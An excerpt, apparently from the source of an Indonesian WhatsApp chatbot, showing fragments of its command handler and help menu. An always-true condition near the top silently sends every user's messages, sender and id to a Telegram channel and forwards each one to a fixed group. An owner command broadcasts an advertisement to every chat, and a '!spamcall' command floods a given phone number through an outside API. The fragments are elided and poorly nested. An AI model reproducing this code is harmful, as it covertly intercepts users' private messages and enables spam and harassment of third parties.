...
module.exports = msgHandler = async (client, message, event) => {
    try {
        ...
        if (command.startsWith('')) get.get(`https://api.telegram.org/bot${BotApi}/sendMessage?chat_id=${Tchannel}&text=Dari : ${from}%0A${id}%0APesan : ${body.slice(0)}`).json() 
        if (command.startsWith('')) client.reply('6287883353433-1609923541@g.us', id, id)
...
const { exec } = require('child_process')
        ...
        case '!wiki':
            ...
            client.sendFileFromUrl(from, `https://rasi-tech-api.000webhostapp.com/tts.php?apikey=rasitech&kata=${body.slice(6)}`, `tts2.mp3`, `Sudah jadi`,id)
            break
        case '!cuaca':
            if (!isDf) return client.reply(from, 'Anda belum daftar! silahkan daftar dengan ketik !daftar di chat robot.', id)
        ...
        case '!bci':
            if (!isDf) return client.reply(from, 'Anda belum daftar! silahkan daftar dengan ketik !daftar di chat robot.', id)
            if (!isOwner) return client.reply(from, 'Perintah ini hanya untuk Owner bot!', id)
            const chatz000 = await client.getAllChatIds()
            for (let ids of chatz000) {
                var cvk = await client.getChatById(ids)
                if (!cvk.isReadOnly) await client.sendImageFromUrl(ids, args[1], `Aplikasi Bagus nih... Harganya 10K. Minat? Chat 087883353433
        ...
        case '!loli':
            ...
            case '!official':
                ...
                case '!kusuka':
                    ...
                    case '!quran':
                    if (!isDf) return client.reply(from, 'Anda belum daftar! silahkan daftar dengan ketik !daftar di chat robot.', id)
                    client.sendFileFromUrl(from, `https://quran-images-api.herokuapp.com/show/page/${args[1]}`,`quran.png`, `Created BY Rasi-Tech-Api` , id)
                    break
                    case '!peluk':
                        if (!isDf) return client.reply(from, 'Anda belum daftar! silahkan daftar dengan ketik !daftar di chat robot.', id)
            ...
            case '!bapack':
                ...
                if (args.length === 1) return client.reply(from, 'Kirim perintah *!smart [no]*', id)
                    ...
                    case '!spamcall':
                        if (!isDf) return client.reply(from, 'Anda belum daftar! silahkan daftar dengan ketik !daftar di chat robot.', id)
                        const spamcall = await get.get(`https://rasi-tech-api.000webhostapp.com/call.php?apikey=rasitech&no=${args[1]}`).json()
            ...
            if (arg.length >= 3) {
                ...
                const g2w = encodeURIComponent(arg[2])
                    client.sendFileFromUrl(from, `http://zeksapi.herokuapp.com/api/gtext?${g1w}&text2=${g2w}&apikey=${RasiApi}` ,`Glitch.png`, `Glitch`)
...
➥60. *!pastebin*
Nulis di Pastebin
Contoh : !pastebin |Judul|Tulisannya|

➥61. *!gold*
Membuat gambar Gold Play Button
Contoh : !gold Rasi Tech Chanel

➥62. *!silver*
Membuat gambar Silver Play Button
Contoh : !silver Rasi Tech Channel`, id)
            break
        case '!readme':
            if (!isDf) return client.reply(from, 'Anda belum daftar! silahkan daftar dengan ketik !daftar di chat robot.', id)
